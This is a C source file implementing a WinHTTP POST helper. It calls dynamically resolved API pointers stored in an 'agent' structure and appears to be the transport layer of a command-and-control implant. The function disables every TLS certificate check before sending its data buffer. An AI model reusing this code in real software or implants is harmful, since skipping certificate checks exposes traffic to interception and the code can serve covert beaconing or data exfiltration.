#include "Http.h"

HANDLE PerformRequest(pAgent agent, LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPVOID DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders) {
	HANDLE hConnect;
	HANDLE hRequest;
	
	DWORD HTTP_FLAGS = 0;
	

	HINTERNET hSession = agent->pWinHttpOpen(UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (!hSession) {
		printf("[!] Failure to create http session token: [%08x]\n", GetLastError());
		return INVALID_HANDLE_VALUE ;
	}

	if (!(hConnect = agent->pWinHttpConnect(hSession, pswzServerName, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
		printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
		return INVALID_HANDLE_VALUE;
	}

	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE; 
	HTTP_FLAGS |= WINHTTP_FLAG_SECURE;


	if (!(hRequest = agent->pWinHttpOpenRequest(hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
		printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", HttpEndpoint, GetLastError());
		return INVALID_HANDLE_VALUE;
	}

	HTTP_FLAGS = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
		SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
		SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
		SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

	if (!agent->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
	{
		printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
		return INVALID_HANDLE_VALUE;
	}

	if (!agent->pWinHttpAddRequestHeaders(hRequest, pswzRequestHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
		printf("[!] Failure to add request headers [%ls]\n", pswzRequestHeaders);
	}
	if (agent->pWinHttpSendRequest(hRequest, NULL, 0, (LPVOID)DataBuff, dwDataLen, dwDataLen, 0))
	{
		if (agent->pWinHttpReceiveResponse(hRequest, NULL))
		{
			DWORD StatusCode = 0;
			DWORD StatusSize = sizeof(DWORD);

			if (!agent->pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
				WINHTTP_HEADER_NAME_BY_INDEX,
				&StatusCode,
				&StatusSize,
				WINHTTP_NO_HEADER_INDEX)) {
				printf("[!] Failure to query status code [%d]\n", StatusCode);
				return INVALID_HANDLE_VALUE;
			}

			if (StatusCode != HTTP_STATUS_OK) {
				printf("[!] Failure to perform request [%d]\n", StatusCode);
				return INVALID_HANDLE_VALUE;
			}
		}
	}
	else {
		printf("Error sending request: [%08x]\n", GetLastError());
	}
	return hRequest;
}